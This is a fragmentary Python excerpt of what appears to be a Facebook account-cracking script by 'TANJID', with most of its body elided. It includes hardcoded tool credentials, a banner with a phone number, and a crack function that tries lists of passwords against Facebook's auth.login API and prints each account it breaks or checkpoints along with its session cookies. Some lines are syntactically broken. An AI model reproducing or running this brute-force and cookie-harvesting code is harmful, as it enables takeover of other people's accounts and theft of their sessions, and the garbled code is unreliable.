...
while attemps < 12345677901:
    ...
    if username == 'TANJID' and password == 'SEX':
...
\033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙒𝙃𝘼??𝙎𝘼𝙋𝙋\033[1;34m    : [★]+8801884153077\033[1;39m     ┃
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[TANJID] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			p = ses.get= 'https://b-api.facebook.com/method/auth.login'
    ...
    # 'cookie': 'datr=GX4iZZOkH2MpOWJOmROLiZYs; sb=GX4iZUoncyRiLzSZX6GShWlF',
    'dpr': '2',
    ...
    'viewport-width': '980',
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•TANJID-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				print(f'\r\033[0;92m[TANJID-OK ➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
